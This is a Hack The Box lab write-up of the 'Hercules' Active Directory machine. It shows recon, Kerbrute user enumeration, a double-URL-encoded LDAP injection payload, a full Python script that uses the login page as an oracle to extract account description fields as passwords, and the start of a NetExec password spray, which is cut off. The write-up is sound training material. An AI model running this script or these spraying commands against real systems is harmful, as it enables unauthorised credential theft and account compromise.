---
title: Hercules
date: 2026-06-12
excerpt: Hack The Box - Insane
cover: ../uploads/cover_hercules.jpg
tags: RBCD Abuse, S4U2Self, S4U2Proxy, ADCS, PKINIT
---

# HackTheBox Hercules— Writeup

Welcome back to another Hack The Box writeup! In this walkthrough, I'll be tackling one of the platform's most challenging machines **Hercules**, an Insane-rated box that puts your offensive security methodology to the test.

Unlike machines that rely on a single vulnerability or straightforward exploitation, Hercules is heavily centered around a complex **Active Directory** environment. Successfully compromising the domain requires strong enumeration, careful privilege escalation, and a deep understanding of Windows internals, authentication mechanisms, and AD attack paths. Missing even a small detail during enumeration can easily lead to dead ends.

Throughout this writeup, I'll document my entire thought process, methodology, and the techniques I used to progress through the machine—from the initial foothold all the way to full domain compromise. Rather than simply listing commands, I'll explain the reasoning behind each step so you can understand *why* a particular approach works and how to apply the same methodology in similar Active Directory engagements.

If you're looking to sharpen your AD penetration testing skills or prepare for advanced certifications and labs, I hope this walkthrough provides valuable insights. Let's dive into Hercules and see what it takes to conquer one of Hack The Box's toughest machines.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FdhROLXPNIfJQfsKtId3i%252Fanime-girl-starting-chainsaw-fdwqign4icddpoij.gif%3Falt%3Dmedia%26token%3D8c128bf9-9ec5-48c5-96fe-4b7a61326a10&width=768&dpr=3&quality=100&sign=ba27bbf8&sv=2)

## Recon

I began the reconnaissance process by performing a thorough `Nmap` scan on the target host to discover open ports, identify active services, and uncover potential entry points for further assessment:

The `Nmap` results identified the target as a **Windows Server** system operating within an **Active Directory domain environment**, as evidenced by the presence of multiple **AD-related services**. Additionally, the domain name `hercules.htb` was exposed through several **service banners** and **SSL certificate details**, providing valuable information for further enumeration.

```bash
nmap -A -T5 10.129.11.157
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-27 02:25 -0400
Warning: 10.129.11.157 giving up on port because retransmission cap hit (2).
Stats: 0:01:25 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.43% done; ETC: 02:26 (0:00:00 remaining)
Nmap scan report for 10.129.11.157
Host is up (0.16s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://10.129.11.157/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-27 06:25:57Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
443/tcp  open  ssl/https     Microsoft-IIS/10.0
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn:
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=hercules.htb
| Subject Alternative Name: DNS:hercules.htb
| Not valid before: 2024-12-04T01:34:56
|_Not valid after:  2034-12-04T01:44:56
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
5986/tcp open  ssl/wsmans?
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|   h2
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-06-27T06:26:47
|_  start_date: N/A
|_clock-skew: -1s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   166.35 ms 10.10.14.1
2   172.26 ms 10.129.11.157

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.08 seconds
```

## Recon: DNS Resolution and Web Service Enumeration

Based on the Nmap findings, the target was identified as part of the `hercules.htb` Active Directory domain, with the domain controller resolving to `dc.hercules.htb`. To ensure proper name resolution and seamless access to the HTTPS service, I added both hostnames to my `/etc/hosts` file.

My next step was to configure Kerberos on my attacking machine. I updated the `krb5.conf` file to explicitly define the `HERCULES.HTB` realm, designate `dc.hercules.htb` as both the **KDC** and **administrative server**, and disable automatic DNS-based realm discovery to ensure Kerberos authentication used the intended domain controller.

```text
[libdefaults]
 dns_lookup_kdc = false
 dns_lookup_realm = false
 default_realm = HERCULES.HTB

[realms]
 HERCULES.HTB = {
 kdc = dc.hercules.htb
 admin_server = dc.hercules.htb
 default_domain = hercules.htb
 }

[domain_realm]
 .hercules.htb = HERCULES.HTB
 hercules.htb = HERCULES.HTB
```

This configuration ensured that all Kerberos interactions were directed explicitly to the domain controller, making the enumeration process more reliable and predictable.

## Enumerating Valid Domain Users

To identify valid users within the domain, I leveraged `Kerbrute` to perform username enumeration against the domain controller. By issuing **Kerberos AS-REQ** requests for each entry in a wordlist, the tool distinguishes existing accounts from invalid ones based on the authentication responses, all without requiring valid credentials.

```shell
┌──(blxckwolf㉿shinku)-[~/go/bin]
└─$ ./kerbrute userenum --dc 10.129.11.157 -d hercules.htb '/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt' -t 100

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 06/27/26 - Ronnie Flathers @ropnop

2026/06/27 02:32:54 >  Using KDC(s):
2026/06/27 02:32:54 >   10.129.11.157:88

2026/06/27 02:32:54 >  [+] VALID USERNAME:       admin@hercules.htb
2026/06/27 02:32:57 >  [+] VALID USERNAME:       administrator@hercules.htb
2026/06/27 02:32:57 >  [+] VALID USERNAME:       Admin@hercules.htb
2026/06/27 02:33:19 >  [+] VALID USERNAME:       Administrator@hercules.htb
2026/06/27 02:33:48 >  [+] VALID USERNAME:       auditor@hercules.htb
2026/06/27 02:35:36 >  [+] VALID USERNAME:       ADMIN@hercules.htb
2026/06/27 02:59:36 >  [+] VALID USERNAME:       will.s@hercules.htb
```

The Kerbrute enumeration successfully identified several **valid domain accounts** by analyzing the Kerberos responses returned by the **KDC**. Among the discovered usernames were `administrator`, `admin`, `auditor`, and `will.s`, confirming that these accounts exist within the `hercules.htb` domain.

These valid usernames provide valuable targets for subsequent attacks, including **AS-REP roasting**, **Kerberoasting**, and carefully controlled **password spraying**. In particular, the presence of administrative accounts and a likely standard user account (`will.s`) offers multiple avenues for further enumeration and credential attacks.

## Web Enumeration

With hostname resolution properly configured, I accessed [`https://hercules.htb`](https://hercules.htb) to perform an initial assessment of the web application. The site consisted of a simple, mostly static interface, and further inspection of the page source, HTTP responses, and client-side resources did not uncover any obvious vulnerabilities or useful information for exploitation.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FmvPbo9xWtHo0Q1nuWxP8%252FScreenshot%2520%282788%29.png%3Falt%3Dmedia%26token%3D8ca4d122-9491-4fe8-b31e-96e01f2c47a0&width=768&dpr=3&quality=100&sign=e0720478&sv=2)

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FknqZPA3nkZ2QcaAF3fdu%252FScreenshot%2520%282789%29.png%3Falt%3Dmedia%26token%3D2cd1216a-8731-4e95-845a-eef542f909c0&width=768&dpr=3&quality=100&sign=990db0a9&sv=2)

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FbZP2bsrow04bCaZaSPOl%252FScreenshot%2520%282790%29.png%3Falt%3Dmedia%26token%3D5e10ae60-38e4-430c-ab0a-d86a4da0ca01&width=768&dpr=3&quality=100&sign=17c5be20&sv=2)

As the initial manual analysis did not reveal any promising attack vectors, I proceeded with **directory brute-forcing** to discover hidden files, directories, and potentially exposed endpoints that were not linked from the main application.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ feroxbuster -u https://hercules.htb --insecure -s 200
                                                                                                                                     
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://hercules.htb/
 🚩  In-Scope Url          │ hercules.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       14l       36w      421c https://hercules.htb/Content/js/error.js
.
.
.
200      GET       53l      162w     3213c https://hercules.htb/Login
```

The **Feroxbuster** scan identified several interesting endpoints, including the common IIS resources `/index` and `/default`, as well as their case variants `/Index` and `/Default`. It also revealed a `302` redirect from `/home` and, most importantly, an accessible login page at `/login` (and `/Login`), both returning an `HTTP 200` response.

The presence of both uppercase and lowercase URL variants strongly suggested that the application was hosted on **Microsoft IIS**, which handles URLs in a case-insensitive manner. With no additional hidden content of interest discovered, the exposed login portal became the primary target for further enumeration.

After discovering the `/Login` endpoint, I performed several authentication attempts to evaluate its behavior. During testing, I observed that the application enforces **rate limiting**: after roughly **10 consecutive failed login attempts**, the server returns an `HTTP 429 (Too Many Requests)` response and temporarily blocks additional requests for approximately **30 seconds**.

This protection effectively prevents conventional **brute-force** and **password spraying** attacks against the login portal. As a result, progressing further required identifying a flaw in the application's authentication logic rather than relying on repeated credential guessing.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FbC8U7OwxOZT2vN1qBL5I%252FScreenshot%2520%282794%29.png%3Falt%3Dmedia%26token%3D45a68961-387d-4e81-a47d-cff33006e7b8&width=768&dpr=3&quality=100&sign=1fe49e11&sv=2)

## Authentication Flow Analysis

Using **Burp Suite** to intercept the login request showed that the application authenticates users through a `POST` request to `/Login` and includes the standard ASP.NET anti-CSRF parameter, `__RequestVerificationToken`.

More importantly, the application returned different error messages depending on the authentication result. Invalid usernames produced an **"Invalid username."** response, whereas valid usernames with incorrect passwords returned **"Login attempt failed."** This distinction indicates that the application verifies the username before validating the password, resulting in **username enumeration** through its response behavior.

Combined with the IIS and Active Directory environment identified during earlier enumeration, this behavior strongly suggested that the login functionality was backed by an **LDAP/Active Directory** authentication service.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FIxXkNRfNoyfFa17Nu9CC%252FScreenshot%2520%282795%29%2520lala.png%3Falt%3Dmedia%26token%3D67e210ad-8dc1-49f3-a1fb-a99e20a49019&width=768&dpr=3&quality=100&sign=81d3bbb1&sv=2)

## Investigating a Potential LDAP Injection

Based on the authentication behavior observed earlier, I suspected that the application was constructing **LDAP queries** using user-supplied input. A typical LDAP search filter used during authentication resembles the following:

```text
(username=<input>)
```

If user-controlled input is embedded into the filter without proper escaping or sanitization, an attacker may be able to manipulate the query using **LDAP filter operators**, **wildcards**, and **logical expressions**, potentially altering how the directory processes the request.

Rather than attempting to bypass authentication, my objective was to exploit this behavior to enumerate information stored within **Active Directory**. Specifically, I targeted the `description` attribute of user objects, as it frequently contains administrative notes, passwords, or other sensitive information that can aid in further exploitation.

## LDAP Injection Strategy

To test the suspected LDAP injection, I supplied a crafted payload in the **username** field that extended the application's original LDAP search filter with an additional condition. Conceptually, the resulting filter resembled the following:

```text
(username=will.s*)(description=<prefix>*)
```

Instead of attempting to bypass authentication, this technique was used to determine whether the `description` attribute of the `will.s` user began with a specific prefix. The application's responses acted as a **boolean oracle**: if the injected filter matched an LDAP object, the server returned **"Login attempt failed."**; otherwise, it responded with **"Invalid username."** By iteratively adjusting the value of `<prefix>`, it was possible to enumerate the contents of the `description` attribute one character at a time.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FjDMEq8yfO3nerAHjuCrK%252FScreenshot%2520%282795%29%2520lala.png%3Falt%3Dmedia%26token%3D121cf3e6-b461-4f85-935f-c9d2002f3dc3&width=768&dpr=3&quality=100&sign=dd348bc8&sv=2)

## Payload Encoding

Initial attempts using a raw LDAP injection payload were unsuccessful. For example, the following input consistently returned **"Invalid username."**, indicating that the payload was either sanitized or altered before reaching the LDAP backend:

```text
will.s*)(description=*)
```

Additional testing revealed that the application required **double URL encoding** for special LDAP characters. Since **IIS/ASP.NET** performs an intermediate decoding step, characters such as `*`, `(`, `)`, and `=` had to be encoded twice so they would remain intact when processed by the LDAP parser. The payload ultimately used was:

```text
will.s%252A%2529%2528description%253D%252A
```

Submitting the double-encoded payload through **Burp Repeater** produced a **"Login attempt failed."** response instead of **"Invalid username."** This behavior confirmed that the injected LDAP filter was successfully evaluated by the backend and that the injected condition matched an existing object, validating the presence of the targeted `description` attribute.

## **Enumerating the description Attribute**

After confirming that the LDAP injection was successful, I leveraged the application's response behavior to enumerate the contents of the `description` attribute incrementally. The technique involved testing whether the attribute began with a specific character or string prefix and observing the server's response to determine whether the condition evaluated to true.

A response of **"Login attempt failed."** indicated that the supplied prefix matched the beginning of the attribute, while **"Invalid username."** signified that the guess was incorrect. By extending the matching prefix one character at a time, the entire value could be reconstructed without requiring valid credentials.

Although the login endpoint enforced **rate limiting**, this approach remained practical because it relied on a small number of carefully crafted requests rather than high-volume authentication attempts. Given the context of the target environment, the `description` attribute was a promising source of sensitive information, potentially containing credentials, administrative notes, or other data useful for subsequent stages of the attack.

Once the LDAP injection technique had been validated, I automated the enumeration process to efficiently extract the target attribute. Performing the attack manually would have been both time-consuming and susceptible to errors, particularly due to the application's rate-limiting mechanism. To streamline the process, I developed a custom Python script, `exp.py`, which systematically enumerates the contents of the LDAP `description` attribute.

```python
#!/usr/bin/env python3
import requests
import string
import urllib3
import re
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HOST = "https://hercules.htb"
ROUTE_LOGIN_FORM = "/login"
ROUTE_LOGIN_POST = "/Login"
POST_URL = HOST + ROUTE_LOGIN_POST
TLS_CHECK = False

MATCH_STRING = "Login attempt failed"

CSRF_PATTERN = re.compile(
    r'name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"',
    re.IGNORECASE
)

ACCOUNTS = [
    "adriana.i", "angelo.o", "ashley.b", "bob.w",
    "camilla.b", "clarissa.c", "elijah.m", "fiona.c",
    "harris.d", "heather.s", "jacob.b", "jennifer.a",
    "jessica.e", "joel.c", "johanna.f", "johnathan.j",
    "ken.w", "mark.s", "mikayla.a", "natalie.a",
    "nate.h", "patrick.s", "ramona.l", "ray.n",
    "rene.s", "shae.j", "stephanie.w", "stephen.m",
    "tanya.r", "tish.c", "vincent.g", "will.s",
    "zeke.s", "auditor"
]


def retrieve_csrf_token(session_obj):
    """Fetch a fresh CSRF token from the login page."""
    resp = session_obj.get(HOST + ROUTE_LOGIN_FORM, verify=TLS_CHECK)
    token_match = CSRF_PATTERN.search(resp.text)
    return token_match.group(1) if token_match else None


def probe_ldap_filter(user, desc_prefix=""):
    """Attempt LDAP injection to validate a description prefix."""
    sess = requests.Session()

    csrf = retrieve_csrf_token(sess)
    if not csrf:
        return False

    # Build the injection vector
    if desc_prefix:
        sanitized = desc_prefix
        for char_map in [('*', '\\2a'), ('(', '\\28'), (')', '\\29')]:
            if char_map[0] in sanitized:
                sanitized = sanitized.replace(char_map[0], char_map[1])
        injection = f"{user}*)(description={sanitized}*"
    else:
        injection = f"{user}*)(description=*"

    # Double URL-encode the injection string
    encoded = ''.join(f'%{b:02X}' for b in injection.encode('utf-8'))

    payload = {
        "Username": encoded,
        "Password": "test",
        "RememberMe": "false",
        "__RequestVerificationToken": csrf
    }

    try:
        resp = sess.post(POST_URL, data=payload, verify=TLS_CHECK, timeout=5)
        return MATCH_STRING in resp.text
    except Exception:
        return False


def extract_description(target_user):
    """Brute-force the description/password field one character at a time."""
    # Character set optimized for password cracking (frequent chars first)
    keyspace = (
        string.ascii_lowercase +
        string.digits +
        string.ascii_uppercase +
        "!@#$_*-." +
        "%^&()=+[]{}|;:',<>?/`~\"\\"
    )

    print(f"\n[*] Processing user: {target_user}")

    # Quick check: does this user even have a description?
    if not probe_ldap_filter(target_user):
        print(f"[-] No description field for {target_user}")
        return None

    print(f"[+] Description found for {target_user}, extracting...")

    recovered = ""
    max_positions = 50
    blanks = 0

    for pos in range(max_positions):
        matched = False

        for candidate in keyspace:
            test_value = recovered + candidate

            if probe_ldap_filter(target_user, test_value):
                recovered += candidate
                print(f"    Offset {pos}: '{candidate}' -> Partial: {recovered}")
                matched = True
                blanks = 0
                break

            time.sleep(0.01)

        if not matched:
            blanks += 1
            if blanks >= 2:
                break

    if recovered:
        print(f"[+] Complete: {target_user} => {recovered}")
        return recovered

    return None


def run():
    print("=" * 60)
    print("Hercules AD — LDAP Description Extraction")
    print(f"Targets enqueued: {len(ACCOUNTS)}")
    print("=" * 60)

    results = {}

    # Order: high-value accounts first
    high_value = ["web_admin", "auditor", "Administrator", "natalie.a", "ken.w"]
    remaining = [u for u in ACCOUNTS if u not in high_value]

    for account in high_value + remaining:
        secret = extract_description(account)
        if secret:
            results[account] = secret
            with open("hercules_passwords.txt", "a") as fh:
                fh.write(f"{account}:{secret}\n")
            print(f"\n[+] CAPTURED: {account}:{secret}\n")

    print("\n" + "=" * 60)
    print("EXTRACTION COMPLETE")
    print("=" * 60)

    if results:
        print(f"\nDiscovered {len(results)} credential(s):")
        for user, pwd in results.items():
            print(f"  {user}: {pwd}")
    else:
        print("\nNo credentials recovered")


if __name__ == "__main__":
    run()
```

The script interacts directly with the `/Login` endpoint while closely emulating a legitimate authentication request. To ensure each request is processed correctly, it performs the following steps:

1. Retrieves a fresh `__RequestVerificationToken` (CSRF token) before every authentication attempt.
2. Preserves session state by using `requests.Session()` to maintain cookies across requests.
3. Sends a crafted LDAP injection payload in the username field while supplying a dummy password.
4. Determines whether the injected condition evaluated successfully by analyzing the application's response.

The script uses the login page as a **boolean oracle**. A response containing **"Login attempt failed."** indicates that the injected LDAP filter matched a valid directory object, whereas **"Invalid username."** signifies that the injected condition did not return any results. This behavior allows the script to automatically reconstruct the target LDAP attribute one character at a time.

After running the script, this is the result:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ python3 exp.py
============================================================
Hercules AD — LDAP Description Extraction
Targets enqueued: 34
============================================================

[*] Processing user: web_admin
[-] No description field for web_admin

[*] Processing user: auditor
[-] No description field for auditor

[*] Processing user: Administrator
[-] No description field for Administrator

[*] Processing user: natalie.a
[-] No description field for natalie.a

[*] Processing user: ken.w
[-] No description field for ken.w
.
.
.
[*] Processing user: johnathan.j
[+] Description found for johnathan.j, extracting...
    Offset 0: 'c' -> Partial: c
    Offset 1: 'h' -> Partial: ch
    Offset 2: 'a' -> Partial: cha
    Offset 3: 'n' -> Partial: chan
    Offset 4: 'g' -> Partial: chang
    Offset 5: 'e' -> Partial: change
    Offset 6: '*' -> Partial: change*
    Offset 7: 't' -> Partial: change*t
    Offset 8: 'h' -> Partial: change*th
    Offset 9: '1' -> Partial: change*th1
    Offset 10: 's' -> Partial: change*th1s
    Offset 11: '_' -> Partial: change*th1s_
    Offset 12: 'p' -> Partial: change*th1s_p
    Offset 13: '@' -> Partial: change*th1s_p@
    Offset 14: 's' -> Partial: change*th1s_p@s
    Offset 15: 's' -> Partial: change*th1s_p@ss
    Offset 16: 'w' -> Partial: change*th1s_p@ssw
    Offset 17: '(' -> Partial: change*th1s_p@ssw(
    Offset 18: ')' -> Partial: change*th1s_p@ssw()
    Offset 19: 'r' -> Partial: change*th1s_p@ssw()r
    Offset 20: 'd' -> Partial: change*th1s_p@ssw()rd
    Offset 21: '!' -> Partial: change*th1s_p@ssw()rd!
    Offset 22: '!' -> Partial: change*th1s_p@ssw()rd!!
[+] Complete: johnathan.j => change*th1s_p@ssw()rd!!
```

## Enumeration Logic

For each valid domain user, the script first determines whether the account contains a populated `description` attribute by injecting the following LDAP filter:

```text
username*)(description=*
```

If the injected condition evaluates successfully, the script proceeds to enumerate the attribute incrementally using a prefix-matching technique. The payload is modified to test whether the `description` value begins with a specific sequence of characters:

```text
username*)(description=<prefix>*
```

Each successful response confirms that the current prefix is correct, allowing the script to append the next character and continue reconstructing the attribute until the complete value is recovered.

Since the target application is hosted on **IIS/ASP.NET**, the injection payload must be **double URL-encoded** before transmission. This ensures that, after the framework performs its decoding stage, the LDAP query reaches the backend in the intended form without being altered.

With the automation in place, the script successfully reconstructed the contents of the `description` attribute by iteratively testing one character at a time. Each successful guess generated a positive response from the application, allowing the matching prefix to be extended until the complete value had been recovered.

The enumeration ultimately revealed the following value stored in the attribute:

```text
change*th1s_p@ssw()rd!!
```

## Validating the Extracted Credentials

After recovering what appeared to be a valid password from the LDAP `description` attribute, I proceeded to verify whether the credentials were accepted by the domain. Rather than assuming the extracted value was correct, I validated it by attempting to authenticate directly against the **LDAP** service on the domain controller.

For this verification, I used **NetExec (**`nxc`**)** to perform an **LDAP bind** over **port** `389`, supplying the recovered password along with the `johnathan.j` account. Successful authentication would confirm that the harvested credentials were valid and could be leveraged for further enumeration or privilege escalation.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ nxc ldap 10.129.11.157 -u johnathan.j -p 'change*th1s_p@ssw()rd!!' -k
LDAP        10.129.11.157   389    DC               [*] None (name:DC) (domain:hercules.htb)
LDAP        10.129.11.157   389    DC               [-] hercules.htb\johnathan.j:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
```

The **NetExec** output successfully identified the target as the **Domain Controller** for the `hercules.htb` Active Directory environment:

```text
LDAP 10.10.11.91 389 DC (domain: hercules.htb)
```

This verified that the LDAP service on **port** `389` was accessible and functioning correctly, confirming reliable connectivity to the domain controller before attempting authentication with the recovered credentials.

Although the LDAP service was reachable, the authentication attempt was unsuccessful and returned the following Kerberos error:

```text
KDC_ERR_PREAUTH_FAILED
```

This response indicates that the **Key Distribution Center (KDC)** rejected the supplied credentials during the **Kerberos pre-authentication** stage, meaning the recovered password was not valid for the `johnathan.j` account.

At this stage, several explanations were possible. The value extracted from the `description` attribute may have been an outdated or temporary password, an administrative hint rather than an actual credential, or a secret intended for a different authentication mechanism instead of standard domain logon. Regardless, the failed Kerberos authentication confirmed that the recovered value could not be used directly for LDAP or domain authentication and required further investigation.

## Exploiting LDAP Injection via Username Parameter

After confirming through **Kerberos enumeration** that the `johnathan.j` account was valid, I attempted to authenticate using the application's login form. As expected, the request returned the generic **"Login attempt failed."** response, confirming that the username existed but the supplied credentials were incorrect.

Rather than focusing on password guessing, I analyzed how the application processed the **username** parameter. The authentication behavior indicated that user input was likely being incorporated directly into an **LDAP search filter**, making the field a potential candidate for **LDAP injection**.

By crafting a payload that terminated the original username filter and introduced an additional LDAP condition, I was able to influence the backend query. This technique made it possible to determine whether the target user's `description` attribute began with a specified prefix, effectively transforming the login endpoint into a side channel for enumerating directory data.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FeudLdjvFok5NZK6W1xxn%252FScreenshot%2520%282797%29.png%3Falt%3Dmedia%26token%3Dacdbe5d2-39c4-4bf7-b888-a1559247a369&width=768&dpr=3&quality=100&sign=9733c7d0&sv=2)

When the injected LDAP condition matched an existing directory object, the application returned the **"Login attempt failed."** message, indicating that the modified query successfully located a valid user. Conversely, if the condition did not match, the application responded with **"Invalid username."**, implying that the LDAP search returned no results.

This distinction in server responses transformed the authentication endpoint into a **boolean oracle**, enabling the contents of LDAP attributes to be inferred by observing whether each injected condition evaluated to true or false.

## Synchronizing Time for Kerberos Authentication

Before attempting authentication against **Kerberos-enabled services**, I synchronized my local system time with the **domain controller**. Since Kerberos relies on closely aligned timestamps between the client and the **KDC**, ensuring clock synchronization helps prevent authentication failures caused by excessive time skew.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ sudo ntpdate 10.129.11.157 hercules.htb
[sudo] password for blxckwolf:
2026-06-27 03:26:11.064103 (-0400) -0.390473 +/- 0.049927 hercules.htb 10.129.11.157 s1 no-leap
```
## Password Spraying the Recovered Credential

Although the value `change*th1s_p@ssw()rd!!` had been recovered from the LDAP `description` attribute, earlier testing showed that it was not valid for the `johnathan.j` account. This suggested that the credential might instead be shared with another domain user, potentially serving as a default or reused password.

To identify the correct account, I created a `users.txt` file containing all previously enumerated domain usernames and performed a **password spraying** attack against the domain controller using **NetExec (**`nxc`**)** over **LDAP**. By testing the recovered password against each known user, I aimed to determine which account, if any, was associated with the extracted credential.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ nxc ldap 10.129.11.157 -u users.txt -p 'change*th1s_p@ssw()rd!!' --continue-on-success -k
LDAP        10.129.11.157   389    DC               [*] None (name:DC) (domain:hercules.htb)
LDAP        10.129.11.157   389    DC               [-] hercules.htb\adriana.i:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        10.129.11.157   389    DC               [-] hercules.htb\angelo.o:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        10.129.11.157   389    DC               [-] hercules.htb\ashley.b:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        10.129.11.157   389    DC               [-] hercules.htb\bob.w:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
